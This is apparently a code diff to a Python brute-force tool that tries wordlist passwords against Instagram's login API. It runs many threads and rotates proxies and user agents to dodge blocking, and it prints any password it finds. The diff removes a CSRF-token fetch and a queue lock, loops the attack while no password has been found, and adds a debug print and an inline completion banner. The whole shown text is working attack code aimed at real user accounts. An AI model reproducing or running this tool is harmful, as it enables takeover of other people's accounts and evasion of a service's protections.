@@ -1,12 +1,10 @@
-from datetime import datetime
-from time import (sleep,time)
+from time import time
 from .proxychecker import ProxyChecker
-from .console import (Console,runnerBruteBanner,bruteAttackFinished)
+from .console import (Console,runnerBruteBanner)
 from threading import (Thread,Lock)
 from queue import Queue
 from random import (choice,randint)
 import requests
-import sys
 import json
 import uuid
 import os
@@ -37,10 +35,6 @@ class Bruter:
             os.system("cls")
             print(Console.BANNER_BRUTE+"\n")
             self.__attackStart()
-
-    def __csrfToken(self):
-        with requests.Session() as session:
-            return session.get("https://www.instagram.com/",headers={"user-agent":self.__useragents()}).cookies.get_dict()["csrftoken"]
 
     def __login(self,q:Queue):
         if not q.empty():
@@ -74,6 +68,7 @@ class Bruter:
                     s = session.post("https://i.instagram.com/api/v1/accounts/login/",data=__data,headers=__header,proxies=__proxies,timeout=randint(5,50))
 
                     json_load = json.loads(s.text)
+                    print(json_load)
                     for k,v in json_load.items():
                         if k == "logged_in_user":
                             self.__isAlive = False
@@ -126,14 +121,13 @@ class Bruter:
     def __attackStart(self):
         __queue = Queue()
         __threads = []
-        __queuelock = Lock()
+        # __queuelock = Lock()
         first = time()
-        try:
-            for passw in self.__readerwordlist():
-                __queue.put(passw)
+        try:                
+            while self.__isAlive:
+                for passw in self.__readerwordlist():
+                    __queue.put(passw)
                 
-            while not __queue.empty():
-                __queuelock.acquire()
                 for _ in range(self.__max_thread):
                     t1 = Thread(target=self.__login,daemon=True,args=(__queue,))
                     t1.start()
@@ -142,7 +136,7 @@ class Bruter:
                 for worker in __threads:
                     worker.join()
                 
-                __queuelock.release()
+                
                 if not self.__isAlive:
                     break
             
@@ -154,7 +148,7 @@ class Bruter:
             else:
                 print(f"{Console.PURPLE}[ {Console.RED}+{Console.PURPLE} ] Password is Found : {Console.CYAN}{self.__passw}{Console.DEFAULT}")
 
-            print(bruteAttackFinished(now_time))
+            print(f"{Console.PURPLE}[ {Console.RED}-{Console.PURPLE} ] Brute Force Attack is completed\n[ {Console.CYAN}?{Console.PURPLE} ]\n  ╰────≻ Attack Lasted {str(now_time)+' Seconds.' if now_time < 60 else str((now_time/60).__round__(3))+' Minutes.'}{Console.DEFAULT}")
         
         except Exception as e:
             print(e)
